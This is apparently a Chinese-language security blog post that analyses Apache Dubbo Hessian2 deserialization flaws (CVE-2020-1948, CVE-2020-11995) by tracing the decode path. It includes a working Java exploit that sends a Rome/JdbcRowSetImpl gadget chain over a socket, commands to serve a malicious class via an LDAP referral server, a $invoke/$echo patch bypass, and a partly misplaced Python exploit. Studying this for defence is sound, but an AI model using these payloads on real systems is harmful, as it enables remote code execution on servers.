1. skeletonMap这个map中的加载流程
2. skeletonMap中的 HttpInvokerServiceExporter 实例化对象如何拿到和构造的。
3. 初始化时，dubbo加载的 DispatcherServlet 是从哪配置的，从哪些代码去实现的。
DispatcherServlet注册
DispatcherServlet的注册逻辑在 org.apache.dubbo.remoting.http.tomcat.TomcatHttpServer
中。
内嵌的tomcat容器，给添加了servlet的注册
protected RemoteInvocation readRemoteInvocation(HttpServletRequest request, 
InputStream is) throws IOException, ClassNotFoundException {
    ObjectInputStream ois = 
this.createObjectInputStream(this.decorateInputStream(request, is));
    RemoteInvocation var4;
    try {
        var4 = this.doReadRemoteInvocation(ois);
    } finally {
        ois.close();
    }
    return var4;
}
protected RemoteInvocation doReadRemoteInvocation(ObjectInputStream ois) throws 
IOException, ClassNotFoundException {
        Object obj = ois.readObject();
        if (!(obj instanceof RemoteInvocation)) {
            throw new RemoteException("Deserialized object needs to be 
assignable to type [" + RemoteInvocation.class.getName() + "]: " + 
ClassUtils.getDescriptiveType(obj));
        } else {
            return (RemoteInvocation)obj;
        }
    }
版本更新
对 skeletonMap 进行了修改，在获取 skeleton 之后就会调用 JsonRpcBasicServer.hanlde ，
JsonRpcBasicServer 是 JsonRpcServer 的父类,在该类中没有反序列化的危险操作。
CVE-2020-1948
漏洞简介
Dubbo 2.7.6或更低版本采用hessian2实现反序列化，其中存在反序列化远程代码执行漏洞。攻击者可
以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当服务端存在可以被利
用的第三方库时，恶意参数被反序列化后形成可被利用的攻击链，直接对Dubbo服务端进行恶意代码执
行。
漏洞版本
Apache Dubbo 2.7.0 ~ 2.7.6
Apache Dubbo 2.6.0 ~ 2.6.7
Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
在实际测试中2.7.8仍旧可以打，而2.7.9失败
漏洞复现
修改 dubbo-samples/dubbo-samples-api/pom.xml
更改dubbo版本为2.7.3
启动dubbo-samples-api项目
    com.rometools
    rome
    1.8.0
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import marshalsec.HessianBase;
import marshalsec.util.Reflections;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
public class GadgetsTestHessian {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        //todo 此处填写ldap url
        rs.setDataSourceName("ldap://127.0.0.1:8087/ExecTest");
        rs.setMatchColumn("foo");
        Reflections.setFieldValue(rs, "listeners",null);
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, 
Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        Reflections.setFieldValue(s, "table", tbl);
        ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new 
ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
        HessianBase.NoWriteReplaceSerializerFactory sf = new 
HessianBase.NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);
        out.writeObject(s);
        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
 byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
        byte[] bytes = byteArrayOutputStream.toByteArray();
        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 
http://127.0.0.1:8090/#ExecTest
python -m http.server #挂载恶意类
poc对dubbo的端口，默认为20880进行发包
漏洞分析
断点打在 org.apache.dubbo.remoting.transport.netty4.NettyCodecAdapter#decode
该位置通过调用 Object msg = NettyCodecAdapter.this.codec.decode(channel, message); ，从
端口中接收序列化数据进行反序列化为一个Object对象。跟踪代码查看具体实现。
  public Object decode(Channel channel, ChannelBuffer buffer) throws IOException 
{
        int save = buffer.readerIndex();
        MultiMessage result = MultiMessage.create();
        while(true) {
            Object obj = this.codec.decode(channel, buffer);
            if (DecodeResult.NEED_MORE_INPUT == obj) {
                buffer.readerIndex(save);
继续跟踪 this.codec.decode(channel, buffer); 位置
来到 org.apache.dubbo.remoting.exchange.codec.ExchangeCodec#decode
                if (result.isEmpty()) {
                    return DecodeResult.NEED_MORE_INPUT;
                } else {
                    return result.size() == 1 ? result.get(0) : result;
                }
            }
            result.addMessage(obj);
            this.logMessageLength(obj, buffer.readerIndex() - save);
            save = buffer.readerIndex();
        }
    }
 public Object decode(Channel channel, ChannelBuffer buffer) throws IOException 
{
        int readable = buffer.readableBytes();
        byte[] header = new byte[Math.min(readable, 16)];
        buffer.readBytes(header);
        return this.decode(channel, buffer, readable, header);
    }
调用 buffer.readableBytes 返回表示 ByteBuf 当前可读取的字节数,这里为670,是接受过来的序列化
数据包的长度，Math.min(readable,16)则取两值中最小的值。作为byte数组的长度，并且调用
buffer.readBytes 读取该大小，这里是16，读取16个长度。
传递到this.decode进行调用
public Object decode(Channel channel, ChannelBuffer buffer) throws IOException {
    int readable = buffer.readableBytes();
    byte[] header = new byte[Math.min(readable, 16)];
    buffer.readBytes(header);
    return this.decode(channel, buffer, readable, header);
}
走到 var8 = this.decodeBody(channel, is, header); 跟进
一路执行来到下面这段代码中
in = CodecSupport.deserialize(channel.getUrl(), is, proto); 位置获取OutputSteam数据，
跟踪查看
 protected Object decode(Channel channel, ChannelBuffer buffer, int readable, 
byte[] header) throws IOException {
        int len;
        int i;
        if ((readable <= 0 || header[0] == MAGIC_HIGH) && (readable <= 1 || 
header[1] == MAGIC_LOW)) {
            if (readable < 16) {
                return DecodeResult.NEED_MORE_INPUT;
            } else {
                //获取数据的长度
                len = Bytes.bytes2int(header, 12);
                checkPayload(channel, (long)len);
                i = len + 16;
                if (readable < i) {
                    return DecodeResult.NEED_MORE_INPUT;
                } else {
                    ChannelBufferInputStream is = new 
ChannelBufferInputStream(buffer, len);
                    Object var8;
                    try {
                        var8 = this.decodeBody(channel, is, header);
getSerialization 位置跟进查看代码
url.getParameter("serialization", "hessian2"); 位置获取序列化的数据类型
返回到上一层方法走到 return s.deserialize(url, is); 位置
实际上这里不是真正意义上的反序列化操作，而是将 is 的数据转换成一个 Hessian2ObjectInput 对象
的实例。
走到这一步执行回到 org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#decodeBody 107行代码
中
data = this.decodeEventData(channel, in);
public static ObjectInput deserialize(URL url, InputStream is, byte proto) 
throws IOException {
    Serialization s = getSerialization(url, proto);
    return s.deserialize(url, is);
}
public ObjectInput deserialize(URL url, InputStream is) throws IOException {
    return new Hessian2ObjectInput(is);
}
至此到达Hession2的反序列化触发点。和前面调试的利用链对比 构造数据的时候多了一下代码
其余都是一致的。
CVE-2020-11995
漏洞简介
Apache Dubbo默认反序列化协议Hessian2被曝存在代码执行漏洞，攻击者可利用漏洞构建一个恶意请
求达到远程代码执行的目的
漏洞版本
Dubbo 2.7.0 ~ 2.7.8 
Dubbo 2.6.0 ~ 2.6.8 
Dubbo 所有 2.5.x 版本 
 byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
设置 method 等于 $invoke 或 $invokeAsync 、 $echo 即可绕过该补丁
if (pts == DubboCodec.EMPTY_CLASS_ARRAY) {
                    if (!RpcUtils.isGenericCall(path, this.getMethodName()) && 
!RpcUtils.isEcho(path, this.getMethodName())) {
                        throw new IllegalArgumentException("Service not found:" 
+ path + ", " + this.getMethodName());
                    }
                    pts = ReflectUtils.desc2classArray(desc);
                }
public static boolean isGenericCall(String path, String method) {
        return "$invoke".equals(method) || "$invokeAsync".equals(method);
    }
public static boolean isEcho(String path, String method) {
        return "$echo".equals(method);
    }
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient
client = DubboClient('127.0.0.1', 20880)
JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8087/Exploit",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )
resp = client.send_request_and_return_response(
    service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',
    method_name='$invoke',
    service_version='1.0.0',
疑惑留存
在前面的构造的Java代码的poc中，即spring aop链或Rome链，能打2.7.8版本，并且没有走到
org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode 补丁处，而使用
python该脚本时候则会走到补丁位置。
在请教了三梦师傅后，得知该补丁只是在 Xbean 利用链基础上进行了修复。导致其他利用链在2.7.8版本
中依旧能使用。但从python代码中看着更像是Rome Gadget的构造。而在实际测试当中，XBean的
Gadget确实走入到了补丁的逻辑处。
在此几个疑惑留存留到后面的dubbo源码分析中去解读结果尚未解决的疑惑点。
参考
Dubbo的反序列化安全问题-Hessian2
dubbo源码浅析：默认反序列化利用之hessian2
Hessian 反序列化及相关利用链
0x05 结尾
天气冷了，注意保暖。共勉。
    args=[toStringBean])